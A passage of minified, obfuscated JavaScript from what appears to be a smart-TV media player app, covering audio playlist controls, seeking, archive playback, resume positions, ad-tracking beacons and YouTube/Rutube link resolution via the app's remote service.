return(c[lIllO0Imlel1IlI1Ypr]||c.html5)},played:function(){if(lIllO0Imlel1IlI1Ypr&&(handler=='player'||handler=='qual')&&$_("player").style.display=="block")return 1},audio:{active:0,player:function(){var c=this;var player=maJor.params.get("player");var a=maJor.params.get('audioplayer');lIllO0Imlel1IlI1Ypr="html5";if(maJor.platform()=="maple")player="maple";else{if(maJor.platform()=="android-device")player="html5";if(maJor.platform()=="mag")player="mag";else if(maJor.platform()=="dune")player="dune";else if(maJor.platform()=="tizen")player="tizen";else if(a!=3){if(a!=4&&(a==2||player=="html5"||player=="ifrhtml5"||player=="jw")){player="html5";lIllO0Imlel1IlI1Ypr="audio"}else player="media"}else if(a==3)player="html5"}
return(vPlayer[player]||vPlayer.html5)},played:function(){return(this.active&&$_("vk_audio")&&$_("vk_audio").style.display=="block")},showPlayer:function(mode){var c=this;if(maJor.read("vk_pl_url").indexOf("http")==-1||maJor.params.get("audioplayer")<1)return;if(!c.pl.length){c.pl=l0OIIlIIlONuu1111Ypr(maJor.read("vk_audio_pl"))||[];c.sel=parseInt(maJor.read("vk_audio_sel"))||0}
if(c.pl.length)c.active=1;else{c.active=0;return}
if($_("vk_audio"))$_("vk_audio").style.display="block";else{var div=document.createElement('div');div.id='vk_audio';div.style.position="absolute";div.style.backgroundColor="rgb(89, 117, 181)";div.style.padding="2px 4px";div.style.borderRadius="5px";div.style.display="block";div.style.fontSize="18px";div.style.width="300px";div.style.height="85px";document.getElementsByTagName('body')[0].appendChild(div)}
$_("vk_audio").style.top=(maJor.screen().h-110)+"px";$_("vk_audio").style.left=(maJor.screen().w-330)+"px";$_("vk_audio","<div id='audiotitle' style='height:43px;overflow:hidden;width:100%;color:#ffd495;'>"+this.pl[this.sel].description+"</div>"+"<div style='position:absolute;top:2px;left:218px;height:10px; width: 70px;  text-align: right;'>"+(parseInt(this.sel)+1)+"/"+this.pl.length+"</div>"+"<div id='rtma' style='position:absolute;  top: 62px;  left: 250px;  width: 50px;  text-align: right;  height: 10px;  font-size:14px;  color: #F8F9F6;'></div>"+"<div onclick=\"keyHandler({'keycode':VK_STOP});\" title='Закрыть / Кнопка СТОП' style='position:absolute;top:0px;left:292px;height:10px;color:rgb(205, 30, 30);'>x</div>"+"<div id='vk_audio_bar' style='float:left;position:relative;top:5px;left:2px;height:10px;width:296px;background-color:#a0b9d6;border-radius:3px;'><div id='vk_audio_pos' style='float:left;position:relative;left:2px;height:6px;top:2px;width:0px;background-color:#5885b8;'></div></div>"+"<ul style='padding-left: 60px;'>"+"<li onclick=\"keyHandler({'keycode':VK_REWIND})\" style='background-position: 0px -105px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li onclick=\"keyHandler({'keycode':VK_PAUSE})\" style='background-position: 0px -38px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li onclick=\"keyHandler({'keycode':VK_PLAY});\" style='background-position: 0px -3px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li onclick=\"keyHandler({'keycode':VK_FAST_FWD})\" style='background-position: 0px -138px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li id='vkr' title='Повтор' onclick=\"vPlayer.audio.repeat(1);\" style='background-position: 0px -174px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"<li title='Перемешать' onclick=\"vPlayer.audio.shuffle();\" style='background-position: 0px -73px;display: inline-block;background-image:url("+_img("_ST_audio_controls.png")+");width:30px;height:35px;'></li>"+"</ul>");$_('vk_audio_bar').onclick=function(e){var BarWidth=296;var x=e.pageX-$(this).offset().left;vPlayer.seek((x/BarWidth)*vPlayer.getTotal())};if(gV(mode)=="autostart")setTimeout('$_("vk_audio").style.zIndex="-2";$_("vk_audio").style.display="none";$_("vk_play_button").style.display="block";',1500);c.repeat()},repeat:function(m){if(m){this.vk_repeat=!this.vk_repeat;if(this.vk_repeat)kjtYpr.inf("Повтор: включен!",1000);else kjtYpr.inf("Повтор: отключен!",1000)}
$_("vkr").style.backgroundPosition=(this.vk_repeat?"33px -174px":"0px -174px")},vk_visual:0,visual:function(n){if(n)this.vk_visual=1;else this.vk_visual=0;if(this.vk_visual){$_("jw","<div style='z-index:1;width:100%;height:100%;background-color:black;'>"+"<img style='width:100%;height:100%;' src='"+_img("_ST_visual"+(n||3)+".gif")+"' />"+"</div>");$_("jw").style.display="block";$_("jw").style.zIndex="1"}else{$_("jw","");$_("jw").style.zIndex="0";$_("jw").style.display="none"}},shuffle:function(){kjtYpr.inf("Перемешано!",1000);for(var j,x,i=this.pl.length;i;j=parseInt(Math.random()*i),x=this.pl[--i],this.pl[i]=this.pl[j],this.pl[j]=x);this.play(null,0)},pl:[],sel:0,play:function(pl,sel){var c=this;if(sel!=null)c.sel=sel;if(pl){this.pl=[];for(var i=0;i<pl.length;i++){pl[i].stream_url=gV(pl[i],"stream_url").replace("audio://","");if(is_audio(pl[i].stream_url)){pl[i].description=IlO11lQ0().get("title").replace(/<.*?>/g,"")+"<br><span style='font-size:14px;color:#EEE;'>"+pl[i].title.replace(/<.*?>/g,"").substr(0,40)+"</span>";this.pl.push(pl[i])}else if(i<c.sel)c.sel--}
maJor.write("vk_pl_url",gP("lII1I1PVBuI1lIlYpr"))}
if(c.sel>c.pl.length-1)c.sel=0;else if(c.sel<0)c.sel=c.pl.length-1;var u=c.pl[c.sel].stream_url.replace("audio://","");if(u.indexOf("md5hash")!=-1){is_loadpage(1);$_("audiotitle","_FPZagruzka_...");uHelper.create("directnoheader").get(c.pl[c.sel].parser.split("|")[0]).parse=function(s){if(s){c.pl[c.sel].stream_url=c.pl[c.sel].stream_url.replace("md5hash",s);play(null,c.sel)}else $_("audiotitle","_FPOshibka_ parse url")}
return}else{c.active=1;if(!vPlayer.stopped)vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();vPlayer.stopped=!1;vPlayer.end_ok=!1;vPlayer.playElement={};c.player().startAudio(u);c.showPlayer();$_("vk_audio").style.zIndex="2";maJor.write("vk_audio_pl",ll1lI1lI0sl0OlIYpr(c.pl));maJor.write("vk_audio_sel",c.sel)}}},l0Ol1NZIl1l11Ypr:function(t){var c=this;t=t||c.l11III0l1u1FMO10OYpr;if(rek_url===""&&t){c.player().seek(t);$_("recovery","");c.l11III0l1u1FMO10OYpr=0;c.llQ0In0OXI0I1IYpr=0}},play:function(){var c=this;if(c.playUrlAudio)c.sound.play();c.player().play();clearTimeout(c.longPauseTimer);c.subtitles.lllIOlu0iNO10IIYpr();if(maJor.platform()=="android-device"){setVideoResolution()}
c.longpause=0;vPlayer.paused=!1},pause:function(){var c=this;c.player().pause();if(c.playUrlAudio)c.sound.pause();if(c.paused)setTimeout("vPlayer.hidePlayer(1);",1000);$_("recovery","");if(rek_url=="")c.l11III0l1u1FMO10OYpr=0;c.SaveTime();c.longPauseTimer=setTimeout(function(){c.longpause=1},30000);c.paused=!0},lTime:-1,getVideoPlayInfo:function(tC,tT){var c=this;if(c.glSec!=0)return;try{if(c.is_mini())return;if(piframe&&sendr&&tT!=null){sendr=!1}
c.curTime=tC||c.getCur();c.totalTime=tT||c.getTotal();if(c.audio.played()){if(c.totalTime-c.curTime<=6&&c.totalTime>0){if(!c.end_ok)c.endTimer=setTimeout("vPlayer.endvideo();",5200);c.end_ok=!0}
if(c.curTime>0&&c.totalTime>0){var pos=Math.ceil((c.curTime/c.totalTime)*292);$_("vk_audio_pos").style.width=css_wh(pos)+"px";$_("rtma","-"+(to2(c.totalTime-c.curTime)))}
return}
if($_("playerBottom").style.display=="block"&&!is_rek)$_("infR",vPlayer.getInfo());if(c.curTime>0||c.totalTime>0){if($_("statbar2").style.display!="none")statusbar("off");c.iptv_succed=!0;c.iptv_retry=0;if($_("loading").style.display=="block")c.setLoading("off",c.curTime);if(rek_url&&c.totalTime>0&&c.curTime>1){if(c.totalTime>600){rek_url="";vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();setTimeout("IlO11lQ0().play(null,lIllO0Imlel1IlI1Ypr);",500);return}
if(c.lTime!=c.curTime){c.lTime=c.curTime;if(Point["skipTime"]>0&&Point["skipTime"]<c.curTime&&c.curTime<=c.totalTime){rekBox("Пропустить рекламу <img width=15 src='"+_img("_ST_enter.png")+"' />")}else{if(Point["skipTime"]>0&&Point["skipTime"]<c.totalTime)var ost=Point["skipTime"]-c.curTime;else ost=c.totalTime-c.curTime;if(ost<0)ost=0;rekBox("Пропустить через "+ost+" сек.")}
if(Point["impression"]!=null){lO1l0Ql0lpNwI01OOYpr(Point["impression"],"half");Point["impression"]=null}
if(Point["dstUrl"]!=null){lO1l0Ql0lpNwI01OOYpr(Point["dstUrl"],"half");Point["dstUrl"]=null}
if(Point["start"]!=null){lO1l0Ql0lpNwI01OOYpr(Point["start"],"half");Point["start"]=null}else if(Math.round(c.totalTime/2)==c.curTime){if(Point["firstQuartile"]!=null){lO1l0Ql0lpNwI01OOYpr(Point["firstQuartile"],"half");Point["firstQuartile"]=null}
lO1l0Ql0lpNwI01OOYpr(Point["midpoint"],"half");Point["midpoint"]=null}else if(Math.round(c.totalTime/4)==c.curTime){lO1l0Ql0lpNwI01OOYpr(Point["firstQuartile"],"half");Point["firstQuartile"]=null}else if(Math.round((c.totalTime/4)*3)==c.curTime){if(Point["midpoint"]!=null){lO1l0Ql0lpNwI01OOYpr(Point["midpoint"],"half");Point["midpoint"]=null}
lO1l0Ql0lpNwI01OOYpr(Point["thirdQuartile"],"half");Point["thirdQuartile"]=null}
if(c.totalTime-c.curTime<=1){if(!c.end_ok)c.endTimer=setTimeout("vPlayer.endvideo();",1000);c.end_ok=!0;return}}}
if(c.playUrlAudio&&c.sound){if(handler=="menu")c.sound.pause();else{if(c.curTime==0)c.sound.play();if(!c.paused){if(Math.abs($_("video").currentTime-c.sound.currentTime)>0&&Math.abs(c.totalTime-c.sound.duration)<10&&c.totalTime>10){if(--c.soundn<1){if(lIllO0Imlel1IlI1Ypr=="html5"||lIllO0Imlel1IlI1Ypr=="ifrhtml5")c.sound.currentTime=$_("video").currentTime;else c.sound.currentTime=c.curTime;kjtYpr.popUp("audio sync "+c.sound.currentTime+"<br>cur="+c.curTime+"<br>Tot="+c.totalTime,800);c.sound.play();c.soundn=20}}}}}
if(c.curTime>c.totalTime&&c.curTime>11*3600)c.curTime=0;if(c.curTime==10&&handler=="player"&&rek_url=="")gP().sendStat(1);if($_("epg_full").style.display=="block"){fEpg.inPlayer();return}
if(c.llQ0In0OXI0I1IYpr&&rek_url==""){vPlayer.l0Ol1NZIl1l11Ypr(c.llQ0In0OXI0I1IYpr);if(lIllO0Imlel1IlI1Ypr=="ifrhtml5"){}
if(lIllO0Imlel1IlI1Ypr=="html5")video.style.display="block";else $_("jw").style.display="block"}
if(lIllO0Imlel1IlI1Ypr!="jw"&&c.totalTime>10&&c.totalTime>c.curTime&&c.totalTime-c.curTime<=5&&(!pstream||is_vod(c.playUrl))&&rek_url==""&&maJor.params.get("next")!=4){if(!c.end_ok)c.endTimer=setTimeout("vPlayer.endvideo();",6000);c.end_ok=!0}
if(c.curTime<30&&c.totalTime>70&&!c.paused)c.getSaveTime();else{$_("recovery","");c.l11III0l1u1FMO10OYpr=0}
if(!is_arc){$_("remainingTime",getTimeFromMS(c.curTime));$_("totalTime","/"+getTimeFromMS(c.totalTime));var pos=Math.ceil((c.curTime/c.totalTime)*maJor.screen().w);if(pos>maJor.screen().w)pos=maJor.screen().w;c.setPosition(pos);if(c.curTime>=30&&c.curTime%15==0)SaveTime()}}
if(is_arc){if(!c.arc_timestamp)var xt=T.timestamp;else{xt=c.arc_timestamp+c.curTime;$_("c.totalTime","<img height='"+css_wh(18)+"' src='"+_img("_ST_archive.png")+"' /> "+gV(vPlayer.playElement,"catchup_days"))}
var tt=T.timestamp-gV(vPlayer.playElement,"catchup_days")*24*3600;var ct=tt+T.timestamp-xt;if(!c.arc_timestamp)$_("remainingTime",dt(xt,!1,!1));else $_("remainingTime",dt(xt,!0,!0));pos=Math.ceil(((xt-tt)/(T.timestamp-tt))*maJor.screen().w);c.setPosition(pos)}}catch(e){}},arc_fwd:0,arc_timestamp:0,arcurl:function(u,t,catchup,catchup_source){var au=u;if(catchup=="default"&&catchup_source)
au=catchup_source.replace("${start}",t).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-t);else if(catchup=="append"&&catchup_source)
au+=catchup_source.replace("${start}",t).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-t);else if(catchup=="flussonic"||catchup=="fs"||catchup=="flussonic-hls")
au=au.replace(/([^\?]*\/)([^\?]*?)(\.|\?|$)(.*)/,"$1$2-"+t+"-10800$3$4");else if(catchup=="shift"||1){if(u.indexOf("?")>0)au+="&";else au+="?";au+="utc="+t+"&lutc="+T.timestamp}
return au},arcfwd:function(sec){var c=this;c.player().stop();c.arc_fwd+=sec;c.setLoading("on");c.arc_timestamp=T.timestamp+c.arc_fwd;var u=c.playElement.source_url||c.playElement.stream_url;var g=gP("global")||{};var source=c.playElement.catchup_source||g["catchup-source"]||g.catchup_source||"";lII11lAO1IOllYpr(arcurl(u,(T.timestamp+arc_fwd),gV(c.playElement,"catchup"),source));c.getVideoPlayInfo()},seek:function(sec){var c=this;sec=Math.ceil(sec);c.glSec=0;$_("arrowtime").style.display="none";if(gV(c.playElement,"catchup")!=""&&gV(c.playElement,"catchup_days")!=""){arcfwd(sec)}else if(c.getTotal()>0){c.player().seek(sec);setTimeout("vPlayer.subtitles.lllIOlu0iNO10IIYpr();",3000)}},setPercent:function(per){var c=this;if(is_arc){var tt=Math.ceil(T.timestamp-(1-(per/100))*gV(c.playElement,"catchup_days")*24*3600);c.arc_fwd=0;c.arc_timestamp=0;c.arcfwd(Math.ceil(tt-T.timestamp))}else if(gP("is_iptv")>2){clearTimeout(qch_timer);qch_timer=setTimeout(function(){qch_num=parseInt(qch_num);if(qch_num>gP().channels.length){kjtYpr.popUp("Не существует!",1300)}else{setSelect(qch_num-1);IlO11lQ0().play()}
qch_num=""},1300);qch_num=qch_num+per/10;kjtYpr.popUp("Open channel: "+qch_num,1500,"on",!0)}else c.setSeek(Math.ceil((per/100)*c.getTotal()),per)},setSeek:function(position,per){var c=this;if(rek_url!=""&&!lI11IDDVl0llOYpr())return!1;gl_buf=0;if(is_arc){$_("arrowtime").style.display="block";var xt=T.timestamp+c.arc_fwd+position;var tt=gV(c.playElement,"catchup_days")*24*3600;var pos=Math.ceil(((tt+c.arc_fwd+position)/tt)*maJor.screen().w);c.setPosition(pos);$_('arrowtime',dt(xt,!0,!0))}else{c.totalTime=vPlayer.getTotal();if(position>0&&position<c.totalTime){var pos=Math.ceil((position/c.totalTime)*maJor.screen().w);if(!c.arc_fwd)c.setPosition(pos);$_("arrowtime").style.display="block";if(per)$_('arrowtime',per+"%");else $_('arrowtime',getTimeFromMS(position))}}
if(pos/maJor.screen().w>0.95)pos=Math.ceil(0.95*maJor.screen().w);if(pos/maJor.screen().w<0.02)pos=30;$_("arrowtime").style.left=(pos-30)+"px";clearTimeout(c.wdtimer);c.wdtimer=setTimeout(function(){c.seek(position)},1200)},frw:function(sec){var c=this;if(rek_url!=""&&!lI11IDDVl0llOYpr())return!1;var x=Math.abs(c.glSec);if(Math.abs(sec)==1){if(x>100)var t=60;else if(x>60)t=25;else t=10;t*=sec}else t=sec;c.glSec+=t;c.setSeek(vPlayer.getCur()+c.glSec)},stream:{stoPip:function(){if(this.setptimer){this.setptimer=0;clearTimeout(this.ptimer)}},setPip:function(elCh,m){var c=vPlayer;c.curTime=0;this.stoPip();if(handler!="menu"||!c.stopped||c.minimize||(c.playElement&&c.playElement.ident==getIdent(elCh.index)))return;if(elCh.stream_url&&elCh.stream_url.match(/^(http|\/)/)){c.setLoading("off");if(m){if(elCh.index==getSelect()&&handler=="menu"){elCh.mini=1;vPlayer.stream.create(elCh)}}else{this.setptimer=1;this.ptimer=setTimeout(function(){c.stream.setPip(elCh,1)},2500)}}},create:function(elCh){var c=vPlayer;var ar=["parser","parser2","mb_parser"];for(tag in ar){if(elCh[ar[tag]]){var params={"ch":elCh,"pq":{},"tag":ar[tag]};params.callback=function(a_pq){c.stream.setPip(a_pq.elCh,1)}
return FXMLPage.l11l00IIjOd10IIOYpr(params)}}
elCh.url=elCh.url||elCh.stream_url.replace(/\\\//g,"/");c.stream.stoPip();if(!c.stopped)c.player().stop();elCh.ident=getIdent();if(elCh.url.indexOf("/hls/userencrypt/")>0){elCh.url=parse_urlm(elCh.url)}
if(handler=="player")c.renderPlayer();if(!this.urlHelper(elCh))is_loadpage(-1)},urlHelper:function(elCh){var c=vPlayer;var url=elCh.url,itemid;if(url.indexOf("=postmd5")>0){if(elCh.postmd5){uHelper.create("direct|rf|proxy").getI(sU(url,"#POSTpostmd5="+encodeURIComponent(elCh.postmd5))).parse=function(s){elCh.url=s;c.lIOI1Iljvp11I0Ypr(elCh)}}else return kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_! Empty POST",2000)}else if(url.match(/(youtube\.com\/|youtu\.be\/)/)&&(itemid=url.match(/.*?(^|\/|v=)([a-zA-Z0-9_-]{11})(.*)?/))){var video_id=itemid[2];statusbar(url,"link");if(maJor.timestamp>=3)var ser="";else if(Math.random()>0.5)ser=4;else ser=3;var u="http://exec"+ser+".remotecurl.spiderxml.com/curl/yt-dlp.php?do=youtube&v="+video_id;uHelper.create("directnoheader").getI(u).parse=function(s){var m=l0OIIlIIlONuu1111Ypr(s);if(m){elCh.json_url=m;c.lO11O011IIIV01010OIYpr(elCh)}else{kjtYpr.inf("YouTube err "+s,1300);is_loadpage(-1)}}}else if((itemid=url.match(/(rutube\.ru)\/play\/embed\/(\d+)/))){var video_id=itemid[2];statusbar(url,"link");if(maJor.timestamp>=3)var ser="";else if(Math.random()>0.5)ser=4;else ser=3;var u="http://exec"+ser+".remotecurl.spiderxml.com/curl/yt-dlp.php?do=rutube&v="+video_id;uHelper.create("directnoheader").getI(u).parse=function(s){var m=l0OIIlIIlONuu1111Ypr(s);if(m){elCh.json_url=m;c.lO11O011IIIV01010OIYpr(elCh)}else{kjtYpr.inf("Rutube err "+s,1300);is_loadpage(-1)}}}else c.lIOI1Iljvp11I0Ypr(elCh);return 1}},lO11O011IIIV01010OIYpr:function(elCh){var c=this;try{var k=0;for(var i in elCh.json_url){if(gV(elCh.json_url[i],"audio")=="")elCh.json_url[i].audio="1";if(gV(elCh.json_url[i],"title")=="")elCh.json_url[i].title=i;if(parseInt(i)>k&&i<(sQual[maJor.params.get('quality')]+40))if(elCh.json_url[i].audio=="1")k=i}
if(k==0){k=10000;for(var i in elCh.json_url){if(parseInt(i)<k&&i>sQual[maJor.params.get('quality')]-40)if(elCh.json_url[i].audio=="1")k=i}}
elCh.url=elCh.json_url[k].url;c.lIOI1Iljvp11I0Ypr(elCh)}catch(e){vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();kjtYpr.inf("Err play "+e.message,1500);is_loadpage(-1)}},streamnum:function(url,m){var c=this;if(typeof url=="object"&&url.length){var n=c.playElement.stream_num||0;if(m)n++;if(!url[n])n=0;c.playElement.stream_num=n;return url[n]}
return url},ftimes:{},getSaveTime:function(){var c=this;var ident=gV(vPlayer.playElement,"ident");if(!ident||!c.ftimes||rek_url||is_rek)return;try{if(c.ftimes[ident]){if(c.ftimes[ident][1]<150&&pstream&&!is_vod())return;vPlayer.l11III0l1u1FMO10OYpr=c.ftimes[ident][0];$_("recovery").style.display=$_("playerBottom").style.display;$_("recovery").style.zIndex="2";$_("recovery","_FPVozobnovitNa_<br/>["+getTimeFromMS(vPlayer.l11III0l1u1FMO10OYpr)+"]");if(c.ftimes[ident][2])c.ftimes[ident][2]++;else c.ftimes[ident][2]=1;maJor.write("times",ll1lI1lI0sl0OlIYpr(c.ftimes))}else if(gV(vPlayer.playElement,"start_time")>0){vPlayer.l11III0l1u1FMO10OYpr=vPlayer.playElement.start_time;$_("recovery").style.display=$_("playerBottom").style.display;$_("recovery").style.zIndex="2";$_("recovery","_FPVozobnovitNa_<br/>["+getTimeFromMS(vPlayer.l11III0l1u1FMO10OYpr)+"]")}else if(allTimes[ident]){vPlayer.l11III0l1u1FMO10OYpr=allTimes[ident][0];$_("recovery").style.display=$_("playerBottom").style.display;$_("recovery").style.zIndex="2";$_("recovery",allTimes[ident].d+"<br/>["+getTimeFromMS(vPlayer.l11III0l1u1FMO10OYpr)+"]")}}catch(e){}},SaveTime:function(mode){var c=this;try{var ident=gV(c.playElement,"ident");if(c.audio.played()||c.is_mini()||!ident||rek_url||is_rek||lIllO0Imlel1IlI1Ypr=="image"||(pstream&&!is_vod()&&(c.getTotal()<150||c.getTotal()>11*3600)))return;var limit_arr=600;if(maJor.platform()=="maple"||maJor.platform()=="android-device"||maJor.platform()=="tizen")limit_arr=1500;if(gV(mode)=="andr"){c.curTime=3;c.totalTime=3}else{c.curTime=vPlayer.getCur();c.totalTime=vPlayer.getTotal()}
if(c.curTime>2&&c.totalTime>0){c.ftimes=c.ftimes||{};try{var st=0,id=null,len=0;for(var i in c.ftimes){if(c.ftimes[i][2]<st||st==0){id=i;st=c.ftimes[i][2]}
len++}
if(len>limit_arr)delete c.ftimes[id];if(c.ftimes[ident]){if(c.curTime>c.ftimes[ident][0]||c.totalTime-c.ftimes[ident][0]<40)c.ftimes[ident][0]=c.curTime;c.ftimes[ident][1]=c.totalTime;c.ftimes[ident][2]=Math.ceil(T.inetTime/10000000)}else c.ftimes[ident]=[c.curTime,c.totalTime,Math.ceil(T.inetTime/10000000)];maJor.write("times",ll1lI1lI0sl0OlIYpr(c.ftimes))}catch(e){}}}catch(e){kjtYpr.popUp("Ошибка сохранения позиции видеофайла: "+e.message,500)}},easystop:function(onlystop){var c=this;c.stopped=!0;$_("loading").style.display="none";if(handler=="player")lIIOOOa1ag001OIYpr();c.player().stop();c.tnum=1;c.curTime=-1;c.totalTime=0;$_("prekinfo").style.display="none";$_("arrowtime").style.display="none";if(c.sound)c.sound.src=null;if(c.playUrlAudio){$_("other","");c.playUrlAudio=""}
is_rek=!1;c.llQ0In0OXI0I1IYpr=0;kjtYpr.lIO10OlItOlLXQlllYpr=0;kjtYpr.lIO10OlItOlLXQlllYprQualIndex=0;c.arc_fwd=0;c.arc_timestamp=0;cntIndex=1;c.chvr=1;c.stream.stoPip();if(onlystop)return;sendr=!0;c.iptv_succed=0;$_("popUp").style.display="none";clearTimeout(c.loaderTimer);clearTimeout(c.endTimer);clearTimeout(c.timeoutWork);clearTimeout(c.lifeTimer);$_("ptt","")},minimize:0,minimizeplayer:function(mode){var c=this;c.minimize=mode;if(mode){c.hidePlayer(!0);$_("main").style.display="block";$_("main").style.zIndex="4";$_("main").style.background="none";$_("main").style.opacity="0.9";handler="menu";linkOver();set_times()}else{$_("main").style.display="none";$_("main").style.zIndex="0";FXMLPage.ll00IOO11EVII1IYpr();$_("main").style.opacity="1";handler="player"}},lIOQ0lI1iZm1hQ1O0Ypr:function(noforce){var c=this;if(!c.stopped){if(c.playElement&&gV(c.playElement.event,"onstopvideo")){var myImage=new Image(1,1);myImage.src=maJor.addident(c.playElement.event.onstopvideo.replace("[curTime]",c.curTime).replace("[totalTime]",c.totalTime))}
c.SaveTime();c.easystop()}
if(c.player().onstop){c.player().onstop();c.player().onstop=null}
c.stream.stoPip();c.player().exit();sethash();lIIOOOa1ag001OIYpr();sendr=!0;c.iptv_succed=0;c.curTime=-1;totalTime=0;c.PLINDEX=-1;kjtYpr.inf("",1);flashmode=null;clearInterval(c.subtitles.timerSub);clearTimeout(c.loaderTimer);clearTimeout(c.timerF);clearTimeout(c.endTimer);clearTimeout(c.timeoutWork);clearTimeout(c.lifeTimer);kjtYpr.inf("");$_("chat","");$_("epg_full","");var curPage=gP()||Ill001();if(curPage.lII1I1PVBuI1lIlYpr.indexOf("extensions://")==0){$_("ext").style.display="block";$_("frame-id").contentWindow.postMessage({'cmd':'focus','text':''},"*")}
if(noforce&&handler=="menu")return;if(c.minimize)c.minimizeplayer(!1);is_loadpage(0);if(c.playUrl=="description"){$_("jw","");c.playUrl=""}else{if(Math.random()>0.4&&$_("player").style.display=="block"&&!rek_url){if(maJor.platform().match(/maple|sony|pa|mag/)&&Math.random()>0.62)kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPBlueKnProporcii_");else{if(curPage.is_iptv>2){if(Math.random()>0.6)kjtYpr.popUp("_FPNpllIIO101FLx100Q01Ypr_?<br> <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPVmEmVp_");else kjtYpr.popUp("_FPNpllIIO101FLx100Q01Ypr_?<br>_FPVoVremProsNazh_ <span style='background-color:orange;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPdVp_. ")}else if(Math.random()>0.6)kjtYpr.popUp("_FPVmVpostBiCe_ "+((pstream)?"IPTV":"_FPVi"+"deo_")+" _FPpleer_а <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ -> HTML5 _FPpleer_ / _FPVstroenniy_</i>");else kjtYpr.popUp("_FPHotChtVfon_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPvVrPrVid_</i>");if(Math.random()>0.3)kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPKnInfoPerRezh_")}}
c.player().stop()}
c.setLoading("off",Math.random());handler="menu";maJor.each("popUp|subtitle|chat|epg_full|QualCh|player|other|jw|recovery|bcg1|bcg2|playermini|whitestripes1|whitestripes2|video".split("|"),function(v){if($_(v))$_(v).style.display="none"});$_("main").style.display="block";if(gP().is_iptv>2)jsc_142427789(null,"notimer");FXMLPage.ll00IOO11EVII1IYpr();IlO11lQ0().focused();set_times()},endrek:function(){var c=this;$_("popUp").style.display="none";if(ttmac){setTimeout('kjtYpr.popUp("endrek '+c.curTime+'/'+c.totalTime+'", 2000);',10000)}
kjtYpr.popUp("",100);maJor.write("rek",T.inetTime);is_adult=!1;rek_last=T.inetTime;rek_q=0;if(lIllO0Imlel1IlI1Ypr=="image"||(vPlayer.getCur()>1&&vPlayer.getTotal()>2)){$.each(Point,function(i,val){if(val&&i.toString().match(/impression|dstUrl|start|midpoint|firstQuartile|thirdQuartile/)){lO1l0Ql0lpNwI01OOYpr(val,"half");Point[i]=""}});if(Point["complete"])lO1l0Ql0lpNwI01OOYpr(Point["complete"],"half");uHelper.create("directnoheader").hid().get("http://browser.appfxml.com/gstatic.php?do=rek&cid=close&appid="+rek_type+maJor.platform()+"&hardware="+kjtYpr.hardware+"&box_server="+nServer+"&box_low="+maJor.box_low+"&title="+curCh("title")+"&"+vPlayer.playUrl);rek_url=""}else{uHelper.create("directnoheader").hid().get("http://browser.appfxml.com/gstatic.php?do=rek&cid=errtimerek&appid="+rek_type+maJor.platform()+"&hardware="+kjtYpr.hardware+"&vr="+vr+"&box_server="+nServer+"&box_low="+maJor.box_low+"&title="+curCh("title"))}},endvideo:function(is_android){var c=this;if(c.is_mini())return;if(c.audio.played()){if(c.audio.vk_repeat)c.audio.play(null,c.audio.sel);else c.audio.play(null,++c.audio.sel);if(c.audio.vk_visual){kjtYpr.popUp(this.pl[this.sel].description,1500)}}else if(rek_url){c.endrek();if(maJor.platform()=="android-device")c.lIOQ0lI1iZm1hQ1O0Ypr();else c.easystop();setTimeout("IlO11lQ0().play(null,rek_mode);",500)}else if(is_android){SaveTime("andr");if((pstream&&!is_vod(c.playUrl))||maJor.params.get('next')<=0)c.lIOQ0lI1iZm1hQ1O0Ypr();else{c.showPlayer();kjtYpr.popUp("Нажмите Назад или закройте видео для отмены действия <b>"+sNext[maJor.params.get('next')]+"</b> через 5сек.",5000,"on");c.timerF=setTimeout(function(){c.endvideo()},5000)}}else{if(maJor.params.get("next")==4)return;if(pstream&&!is_vod(c.playUrl))return;else if(parseInt(maJor.params.get('next'))==2){c.easystop();lII11lAO1IOllYpr(c.playUrl)}else if(parseInt(maJor.params.get('next'))==1&&(getSelect()+1)<curPage.channels.length&&curPage.channels[getSelect()+1].stream_url!='')l10IQI0OcGKI011Il11Ypr();else if(parseInt(maJor.params.get('next'))==3)l10IQI0OcGKI011Il11Ypr();else c.lIOQ0lI1iZm1hQ1O0Ypr()}},is_mini:function(){return vPlayer.playElement&&vPlayer.playElement.mini},lifeSec:-1,lifeN:0,lifeTimer:null,lastSec:-1,loaderTimer:null,setLoading:function(mode,sec){var c=this,timer;clearTimeout(c.loaderTimer);if(lIllO0Imlel1IlI1Ypr=="jw"||c.stopped){$_("loading").style.display="none";return}
if(c.is_mini()){$_("loading").style.left="1010px";$_("loading").style.top=(maJor.screen().h-185)+"px"}else{$_("loading").style.left="580px";$_("loading").style.top="250px"}
if(mode=="on"){if(handler=="menu"&&!vPlayer.is_mini())return;$_("loading").style.display="block";if(sec){c.lastSec=sec}
if(lIllO0Imlel1IlI1Ypr=="media"&&maJor.platform().match(/lg/)&&maJor.series!="LW")timer=25000;else if(maJor.platform().match(/tizen|maple|android-device/))timer=maJor.params.get("timeoutiptv")*1000;else if(maJor.platform()=="mag")timer=60000;else if(pstream||lIllO0Imlel1IlI1Ypr=="media"||lIllO0Imlel1IlI1Ypr=="ext")timer=1500;else timer=10000;c.loaderTimer=setTimeout('$_("loading").style.display="none";',timer)}
